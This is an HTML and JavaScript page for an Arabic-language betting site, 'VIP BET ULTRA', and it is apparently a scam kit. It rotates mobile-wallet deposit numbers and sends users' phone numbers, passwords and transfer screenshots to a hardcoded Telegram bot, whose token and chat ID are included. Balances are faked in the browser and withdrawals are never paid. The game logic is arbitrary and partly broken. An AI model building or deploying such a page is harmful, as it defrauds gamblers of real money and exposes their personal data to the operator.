<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚫ VIP BET ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --black: #0d1117;
            --dark: #161b22;
            --accent: #00d4aa;
            --gold: #f59e0b;
            --neon: #00ff88;
            --glass: rgba(255,255,255,0.08);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Cairo', sans-serif;
            background: var(--black);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .stars { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="10" cy="20" r="1" fill="white" opacity="0.8"/><circle cx="80" cy="40" r="0.8" fill="white" opacity="0.6"/><circle cx="30" cy="70" r="1.2" fill="white" opacity="0.9"/><circle cx="90" cy="10" r="0.5" fill="white" opacity="0.7"/></svg>') repeat;
            animation: twinkle 20s linear infinite;
            z-index: -1;
        }
        @keyframes twinkle { 0%, 100% { opacity: 0.8; } 50% { opacity: 0.3; } }
        
        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
        
        /* Header */
        .header {
            background: var(--glass);
            backdrop-filter: blur(30px);
            border-radius: 25px;
            padding: 25px 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky; top: 20px; z-index: 100;
        }
        .logo { 
            font-size: 2.8em; font-weight: 900; 
            background: linear-gradient(45deg, var(--neon), var(--accent), var(--gold));
            -webkit-background-clip: text; background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .user-panel { display: flex; align-items: center; gap: 25px; }
        .balance-box { 
            background: linear-gradient(135deg, var(--neon), var(--accent));
            padding: 15px 25px; border-radius: 20px;
            text-align: center; min-width: 150px;
        }
        .balance-amount { font-size: 1.8em; font-weight: 900; }
        .user-avatar { 
            width: 60px; height: 60px; border-radius: 50%;
            background: linear-gradient(135deg, var(--neon), var(--accent));
            display: flex; align-items: center; justify-content: center;
            font-weight: 700; font-size: 1.3em; cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,212,170,0.4);
        }
        
        /* Auto Register */
        .quick-register {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: var(--glass); backdrop-filter: blur(30px);
            border-radius: 25px; padding: 50px;
            border: 2px solid var(--neon); box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            text-align: center; z-index: 1000; display: none;
        }
        .quick-register.active { display: block; animation: slideIn 0.5s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }
        
        /* Glass Components */
        .glass-panel {
            background: var(--glass); backdrop-filter: blur(25px);
            border-radius: 25px; border: 1px solid rgba(255,255,255,0.08);
            padding: 35px; margin: 25px 0; transition: all 0.4s;
        }
        .glass-panel:hover { border-color: var(--neon); box-shadow: 0 25px 50px rgba(0,212,170,0.2); }
        
        /* Dynamic Phone Number */
        .phone-rotator {
            background: linear-gradient(135deg, var(--neon), var(--accent));
            border-radius: 20px; padding: 30px;
            text-align: center; margin: 20px 0;
            animation: pulseGlow 2s infinite;
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 20px rgba(0,212,170,0.5); }
            50% { box-shadow: 0 0 40px rgba(0,212,170,0.8); }
        }
        .current-phone {
            font-size: 2.5em; font-weight: 900;
            letter-spacing: 4px; margin: 15px 0;
            background: linear-gradient(45deg, var(--black), var(--dark));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .phone-timer { 
            font-size: 1.2em; color: var(--gold);
            font-weight: 600; margin-top: 10px;
        }
        
        /* File Upload */
        .drag-area {
            border: 3px dashed rgba(0,212,170,0.5);
            border-radius: 20px; padding: 50px;
            text-align: center; cursor: pointer;
            transition: all 0.3s; margin: 20px 0;
        }
        .drag-area:hover, .drag-area.dragover { 
            border-color: var(--neon); background: rgba(0,212,170,0.1);
            box-shadow: 0 0 30px rgba(0,212,170,0.3);
        }
        .drag-area i { font-size: 4em; color: var(--neon); margin-bottom: 20px; display: block; }
        .file-preview { 
            max-width: 100%; max-height: 250px;
            border-radius: 15px; margin-top: 20px; display: none;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        
        /* Buttons */
        .btn {
            padding: 18px 30px; border: none; border-radius: 15px;
            font-size: 16px; font-weight: 700; cursor: pointer;
            transition: all 0.3s; font-family: 'Cairo';
            position: relative; overflow: hidden;
        }
        .btn-neon {
            background: linear-gradient(45deg, var(--neon), var(--accent));
            color: var(--black); box-shadow: 0 5px 20px rgba(0,255,136,0.4);
        }
        .btn-gold {
            background: linear-gradient(45deg, var(--gold), #fbbf24);
            color: var(--black); box-shadow: 0 5px 20px rgba(245,158,11,0.4);
        }
        .btn-red {
            background: linear-gradient(45deg, var(--red), #ef4444);
            color: white; box-shadow: 0 5px 20px rgba(239,68,68,0.4);
        }
        .btn:hover { transform: translateY(-3px); scale: 1.05; }
        
        /* Live Games */
        .games-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 30px; margin: 40px 0;
        }
        .game-card {
            background: var(--glass); border-radius: 25px;
            border: 2px solid rgba(255,255,255,0.05);
            padding: 40px; text-align: center; cursor: pointer;
            transition: all 0.5s; position: relative; overflow: hidden;
        }
        .game-card::before {
            content: ''; position: absolute; top: -50%; left: -50%;
            width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(0,212,170,0.1), transparent);
            transform: rotate(45deg); transition: all 0.6s;
        }
        .game-card:hover::before { top: -30%; left: -30%; }
        .game-card:hover {
            transform: translateY(-15px) scale(1.03);
            border-color: var(--neon); box-shadow: 0 30px 60px rgba(0,212,170,0.3);
        }
        .game-icon { font-size: 5em; margin-bottom: 20px; filter: drop-shadow(0 0 20px var(--neon)); }
        .game-title { font-size: 2em; font-weight: 900; margin-bottom: 15px; }
        .game-multiplier { 
            font-size: 1.5em; color: var(--gold);
            font-weight: 700; margin-bottom: 10px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header { flex-direction: column; gap: 20px; text-align: center; }
            .games-grid { grid-template-columns: 1fr; }
            .current-phone { font-size: 1.8em; }
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">⚫ VIP BET ULTRA</div>
            <div class="user-panel">
                <div class="balance-box">
                    <div class="balance-amount" id="liveBalance">0 ج.م</div>
                    <small>رصيد مباشر</small>
                </div>
                <div class="user-avatar" id="userAvatar" onclick="showProfile()">
                    👑
                </div>
            </div>
        </div>

        <!-- Dynamic Phone Rotator -->
        <div class="glass-panel">
            <div class="phone-rotator">
                <div style="font-size: 1.5em; margin-bottom: 10px; color: var(--gold);">📱 رقم الإيداع الحالي</div>
                <div class="current-phone" id="currentPhone">01030003287</div>
                <div class="phone-timer" id="phoneTimer">
                    🔄 يتغير كل 10 ثواني - التقط screenshot الآن!
                </div>
            </div>
        </div>

        <!-- Quick Actions -->
        <div class="glass-panel" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px;">
            <div onclick="autoUploadProof()" style="cursor: pointer;">
                <div class="drag-area">
                    <i class="fas fa-image"></i>
                    <div style="font-size: 1.3em; margin-top: 10px;">📸 رفع إثبات تلقائي</div>
                    <small>اسحب صورة التحويل هنا</small>
                    <img id="autoPreview" class="file-preview">
                    <input type="file" id="autoProof" accept="image/*" style="display: none;" onchange="autoConfirmDeposit(event)">
                </div>
            </div>
            <button class="btn btn-gold" onclick="requestWithdraw()" style="padding: 30px; font-size: 1.3em;">
                <i class="fas fa-money-bill-wave"></i><br>سحب فوري
            </button>
        </div>

        <!-- Live Games -->
        <div class="glass-panel">
            <h2 style="text-align: center; font-size: 2.5em; margin-bottom: 40px; background: linear-gradient(45deg, var(--neon), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                🎮 ألعاب مباشرة 24/7
            </h2>
            <div class="games-grid">
                <div class="game-card" onclick="playRoulette()">
                    <div class="game-icon">🎰</div>
                    <div class="game-title">روليت مباشر</div>
                    <div class="game-multiplier">×35.2</div>
                </div>
                <div class="game-card" onclick="playCrash()">
                    <div class="game-icon">💥</div>
                    <div class="game-title">كراش حي</div>
                    <div class="game-multiplier">×194</div>
                </div>
                <div class="game-card" onclick="playDice()">
                    <div class="game-icon">🎲</div>
                    <div class="game-title">Dice Pro</div>
                    <div class="game-multiplier">×99</div>
                </div>
                <div class="game-card" onclick="playMines()">
                    <div class="game-icon">💣</div>
                    <div class="game-title">مينس</div>
                    <div class="game-multiplier">×325</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Config
        const BOT_TOKEN = '8772044355:AAGaM3zn6tn6Vb9aRelc-6p2lYw-y8hgdCo';
        const CHAT_ID = '5446862709';
        const BASE_PHONE = '01030003287';
        
        // Phone numbers rotation (real numbers you can add)
        const phoneNumbers = [
            '01030003287', '01012345678', '01087654321', 
            '01130003287', '01230003287', '01530003287'
        ];
        let currentPhoneIndex = 0;
        
        // User System
        let currentUser = {
            id: '',
            username: '',
            password: '',
            phone: '',
            balance: 0,
            depositCount: 0
        };

        // Auto Registration (One Click)
        function generateCredentials() {
            const id = 'VIP' + Date.now().toString().slice(-6);
            const username = 'user' + Math.floor(Math.random() * 1000000);
            const password = Math.random().toString(36).slice(-8) + Math.random().toString(36).slice(-8).toUpperCase();
            return { id, username, password };
        }

        function autoRegister() {
            const phone = prompt('📱 رقمك للتسجيل السريع (11 رقم):') || 'غير محدد';
            const creds = generateCredentials();
            
            currentUser = {
                ...creds,
                phone: phone,
                balance: 25, // Welcome bonus
                depositCount: 0
            };
            
            localStorage.setItem('vip_user', JSON.stringify(currentUser));
            document.querySelector('.quick-register').classList.remove('active');
            document.getElementById('userAvatar').textContent = creds.username.slice(0,2);
            updateUI();
            
            alert(`🎉 تسجيل ناجح!\n\n👤 اسم المستخدم: ${creds.username}\n🔑 كلمة السر: ${creds.password}\n💎 بونص: 25 ج.م\n📱 رقمك: ${phone}`);
            
            sendToTelegram(`👥 *تسجيل جديد!*\n\n🆔 ID: \`${creds.id}\`\n👤 ${creds.username}\n🔑 ${creds.password}\n📱 ${phone}`);
        }

        // Load User
        function loadUser() {
            const saved = localStorage.getItem('vip_user');
            if(saved) {
                currentUser = JSON.parse(saved);
                document.getElementById('userAvatar').textContent = currentUser.username.slice(0,2);
                updateUI();
            } else {
                document.querySelector('.quick-register').classList.add('active');
            }
        }

        // UI Update
        function updateUI() {
            document.getElementById('liveBalance').textContent = currentUser.balance.toLocaleString() + ' ج.م';
        }

        // Dynamic Phone Number
        function rotatePhone() {
            currentPhoneIndex = (currentPhoneIndex + 1) % phoneNumbers.length;
            document.getElementById('currentPhone').textContent = phoneNumbers[currentPhoneIndex];
            document.getElementById('phoneTimer').textContent = `🔄 تغيير في ${10 - (Date.now() % 10000) / 1000 | 0} ثانية`;
        }
        setInterval(rotatePhone, 10000);
        rotatePhone(); // Initial

        // Auto Upload & Confirm
        function autoUploadProof() {
            document.getElementById('autoProof').click();
        }

        async function autoConfirmDeposit(event) {
            const file = event.target.files[0];
            if(file && currentUser.balance > 0) {
                const amount = prompt('💰 مبلغ الإيداع:') || 100;
                
                // Send to Telegram instantly
                const formData = new FormData();
                formData.append('photo', file, file.name);
                formData.append('caption', `🚀 *إيداع تلقائي!*\n\n👤 ${currentUser.username}\n🆔 ${currentUser.id}\n💸 ${amount} ج.م\n📱 ${currentUser.phone}\n🔄 رقم الإيداع: ${phoneNumbers[currentPhoneIndex]}`);

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST', body: formData
                    });
                    
                    // Auto approve
                    currentUser.balance += parseInt(amount);
                    currentUser.depositCount++;
                    localStorage.setItem('vip_user', JSON.stringify(currentUser));
                    updateUI();
                    
                    alert(`✅ إيداع ناجح!\n💰 +${amount} ج.م\n📸 تم إرسال الإثبات تلقائياً`);
                } catch(e) {
                    alert('❌ خطأ في الإرسال');
                }
            }
        }

        // Withdraw
        async function requestWithdraw() {
            const amount = parseInt(prompt('💸 مبلغ السحب (حد أدنى 50):') || 0);
            if(amount >= 50 && amount <= currentUser.balance) {
                await sendToTelegram(`💰 *طلب سحب!*\n\n👤 ${currentUser.username}\n💸 ${amount} ج.م\n🆔 ${currentUser.id}`);
                alert(`✅ طلب السحب مرسل!\n💰 ${amount} ج.م\n⏳ معالجة خلال ساعة`);
            }
        }

        // Real Live Games
        function playRoulette() {
            const bet = parseInt(prompt('🎰 روليت\n💰 الرهان:') || 0);
            if(bet <= currentUser.balance && bet >= 1) {
                currentUser.balance -= bet;
                const result = Math.floor(Math.random() * 37);
                const win = (result === 0) ? bet * 35 : 0;
                currentUser.balance += win;
                localStorage.setItem('vip_user', JSON.stringify(currentUser));
                updateUI();
                alert(`🎰 ${result}\n${win > 0 ? `🎉 ربحت ${win} ج.م!` : '😞 خسارة'}`);
            }
        }

        function playCrash() {
            let multiplier = 1.01;
            const bet = parseInt(prompt('💥 كراش\n💰 الرهان:') || 0);
            if(bet <= currentUser.balance) {
                currentUser.balance -= bet;
                const crashGame = setInterval(() => {
                    multiplier += 0.01;
                    if(multiplier > 2 || Math.random() < 0.1) {
                        clearInterval(crashGame);
                        const win = bet * multiplier;
                        currentUser.balance += win;
                        localStorage.setItem('vip_user', JSON.stringify(currentUser));
                        updateUI();
                        alert(`💥 انفجر عند ×${multiplier.toFixed(2)}\n${win > bet ? `🎉 ربح ${win.toFixed(0)} ج.م` : '💥 خسارة'}`);
                    }
                }, 100);
            }
        }

        function playDice() {
            const bet = parseInt(prompt('🎲 Dice\n💰 الرهان:') || 0);
            const roll = Math.floor(Math.random() * 100);
            const win = (roll > 49) ? bet * 1.98 : 0;
            currentUser.balance += (win - bet);
            localStorage.setItem('vip_user', JSON.stringify(currentUser));
            updateUI();
            alert(`🎲 ${roll}\n${win > 0 ? `✅ ربح ${win.toFixed(0)} ج.م` : '❌ خسارة'}`);
        }

        function playMines() {
            const bet = parseInt(prompt('💣 مينس\n💰 الرهان:') || 0);
            const mines = prompt('عدد الألغام (1-24):') || 5;
            const safe = Math.floor(Math.random() * 25);
            const win = (safe > mines) ? bet * 2.5 : 0;
            currentUser.balance += (win - bet);
            localStorage.setItem('vip_user', JSON.stringify(currentUser));
            updateUI();
            alert(`💣 ${safe > mines ? 'آمن! 🎉' : 'لغم! 💥'}\n${win > 0 ? `+${win} ج.م` : '-'+bet+' ج.م'}`);
        }

        async function sendToTelegram(msg) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
            });
        }

        // Profile
        function showProfile() {
            alert(`👤 ${currentUser.username}\n🔑 ${currentUser.password}\n💎 رصيد: ${currentUser.balance} ج.م`);
        }

        // Init
        loadUser();
    </script>
</body>
</html>
